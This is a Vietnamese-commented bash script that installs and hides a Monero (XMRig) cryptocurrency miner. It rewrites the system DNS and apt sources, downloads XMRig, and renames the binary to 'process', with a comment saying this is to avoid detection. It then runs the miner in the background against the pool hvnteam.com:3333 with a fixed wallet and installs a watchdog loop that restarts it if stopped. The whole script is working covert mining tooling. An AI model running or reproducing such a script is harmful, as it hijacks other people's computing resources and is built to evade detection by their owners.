#!/bin/bash
# Cài đặt các gói cần thiết trong nền để không làm chậm script
export DEBIAN_FRONTEND=noninteractive
echo "🛠 Đang tối ưu hệ thống & cập nhật..."
(sudo sed -i '/cli.github.com/d' /etc/apt/sources.list; \
 sudo sed -i '/cli.github.com/d' /etc/apt/sources.list.d/*.list; \
 echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf > /dev/null; \
 sudo sed -i 's|http://archive.ubuntu.com|http://mirrors.ubuntu.com|' /etc/apt/sources.list; \
 sudo apt update -o Acquire::Queue-Mode=access -o Acquire::http::No-Cache=True -o Acquire::http::Pipeline-Depth=0) &

# Tải XMRig trong khi hệ thống cập nhật
mkdir -p ~/xmrig && cd ~/xmrig
if [ ! -f "xmrig-6.22.2-focal-x64.tar.gz" ]; then
    echo "⬇ Đang tải XMRig..."
    wget -q --show-progress https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
fi

# Chờ cập nhật hoàn tất trước khi giải nén
wait
echo "📂 Giải nén XMRig..."
tar -xf xmrig-6.22.2-focal-x64.tar.gz
cd xmrig-6.22.2

# Đổi tên trình đào để tránh bị phát hiện
mv xmrig process
chmod +x process

# Tạo script chạy trình đào ẩn với `nohup`
echo '#!/bin/bash
nohup ./process --url hvnteam.com:3333 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ --pass x --donate-level 1 --cpu-priority 5 --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
disown
' > start.sh

chmod +x start.sh
./start.sh

# Tạo script kiểm tra & tự động khởi động lại nếu bị dừng
echo '#!/bin/bash
while true; do
    if ! pgrep -x "process" > /dev/null
    then
        echo "🔄 Trình đào bị dừng! Đang khởi động lại..."
        cd ~/xmrig/xmrig-6.22.2
        nohup ./process --url hvnteam.com:3333 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ --pass x --donate-level 1 --cpu-priority 5 --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
        disown
    fi
    sleep 60
done' > watchdog.sh

chmod +x watchdog.sh
nohup ./watchdog.sh > /dev/null 2>&1 &
disown

# Hiển thị thông báo hoàn tất
echo "✅ Trình đào XMR trên Pool hvnteam.com:3333 đang chạy ẩn!"
echo "⏳ Kiểm tra thu nhập tại Pool."
